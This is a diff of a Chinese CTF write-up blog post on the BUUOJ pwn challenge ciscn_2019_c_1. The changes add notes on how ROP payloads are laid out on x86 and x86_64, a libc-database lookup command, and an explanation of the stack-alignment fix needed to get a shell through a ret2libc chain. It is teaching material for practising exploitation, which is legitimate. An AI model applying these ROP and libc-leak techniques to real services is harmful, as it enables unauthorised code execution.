@@ -1,13 +1,13 @@
 ---
 layout: post
-title:  "信息安全学习笔记 - BUUOJ Pwn 入门 ciscn_2019_c_1"
-date:   2020-07-11 12:15:38 +0800
+title:  "Pwn 入门笔记 ciscn_2019_c_1"
+date:   2020-07-14 12:15:38 +0800
 ---
 
 # ciscn_2019_c_1
 
 ## Overview
-把程序下载下来先检查下是什么情况：`amd64`，禁止从堆栈执行代码，可能需要找程序本身代码片段。
+先把程序下载下来检查下是什么情况：x86-64，有符号表，禁止从堆栈执行代码而且没有堆栈保护。
 ```shell
 [root@VM_0_5_centos buuoj]# file ciscn_2019_c_1 
 ciscn_2019_c_1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=06ddf49af2b8c7ed708d3cfd8aec8757bca82544, not stripped
@@ -97,6 +97,22 @@ libc库的内容是动态装载到进程空间的，里边的函数和变量的�
 
 ## Payload
 
+### Diffs between x86 and x86_64
+
+在 x86 和 x86_64 两种架构下、ROP 方法的 payload 组织方式有所不同：
+- x86 非syscall: 
+  - 参数通过栈传递，因此一般无需pop|ret指令；
+  - 函数能直接访问在payload中预先防止放置的数据，是因为这数据作为些参数通过ebp被访问，而ebp会在函数prologue中设置
+    - prologue: `push ebp;mov ebp, esp`
+    - epilogue: `leave;ret`
+  - 组织形式：`FUNCTION ADDR` + `RETURN ADDR` + `ARGUMENT_0...N`
+- x86_64:
+  - 前6个参数依次[通过寄存器传递](https://stackoverflow.com/a/2538212/8706476)： RDI, RSI, RDX, RCX, R8, R9
+  - gadget 均包含ret指令；
+  - 组织形式：`FUNCTION ADDR` + `GADGET_0 ADDR` + `ARGUMENT_0` + ... + `GADGET_N ADDR` + `ARGUMENT_N` 
+
+### Shell
+
 为了输出`puts()`的地址，可以将`puts()`在GOT中的地址0x602020作为参数、调用`puts()`并打屏。因为amd64下参数一般通过寄存器传递，第一个参数存储在rdi，所以需要找到形如 `pop rdi;ret` 的gadgets地址去覆盖返回地址，紧跟着作为参数的0x602020(GOT)以及ret的返回地址0x4006e0(PLT)。为了能够第二次输入payload，还需要让程序正常地回到main：
 ```shell
 ROPgadget --binary ciscn_2019_c_1 --only 'pop|ret'
@@ -136,6 +152,8 @@ python3 -m pip show LibcSearcher | grep Location
 cd /home/LibcSearcher/libc-database/
 # cd 到LibcSearcher依赖的libc-database目录
 ./add /lib64/libc.so.6
+./find puts 6b0
+# 输出对应的libc库的id
 ```
 
 计算`system()`:
@@ -161,4 +179,4 @@ proc.sendline(payload)
 proc.interactive()
 ```
 
-上述代码在本地CentOS7.7可以成功拉起shell，然而拉到线上就 segfault. 查阅网上资料发现这是因为Ubuntu18调用system之前会检查栈顶是否对齐16字节，要加上一个ret去尝试。完整的代码在[这里]({{ site.url }}/assets/ciscn_2019_c_1.py)
+上述代码在本地CentOS7.7可以成功拉起shell，然而拉到线上就 segfault. 查阅网上资料发现这是因为Ubuntu18调用system之前会检查栈顶是否对齐16字节，要加上一个ret(相当于加8字节)去尝试。完整的代码在[这里]({{ site.url }}/assets/ciscn_2019_c_1.py)
